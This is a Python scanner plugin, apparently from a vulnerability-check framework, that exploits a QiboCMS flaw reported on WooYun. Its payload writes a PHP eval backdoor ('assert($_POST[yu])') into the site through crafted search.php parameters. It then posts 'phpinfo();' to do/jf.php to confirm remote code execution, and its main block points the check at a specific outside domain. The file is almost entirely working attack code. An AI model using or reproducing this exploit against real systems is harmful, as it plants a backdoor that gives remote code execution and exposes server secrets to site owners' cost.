#!/usr/bin/python
#-*- encoding:utf-8 -*-
#ref http://www.wooyun.org/bugs/wooyun-2015-0122599

def assign(service, arg):
    if service == "qibocms":
        return True, arg


def audit(arg):
    payload = 'search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[yu])}'
    url1 = arg + payload
    url2 = arg + 'do/jf.php'
    post = 'yu=phpinfo();'
    code, head, res, errcode, _ = curl.curl2(url1)
    code, head, res, errcode, _ = curl.curl2(url2,post=post)
    if code==500 and 'phpinfo()' in res and 'AUTH_PASSWORD' in res:
        security_hole(url2)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.xn--ttsz43a.net/')[1])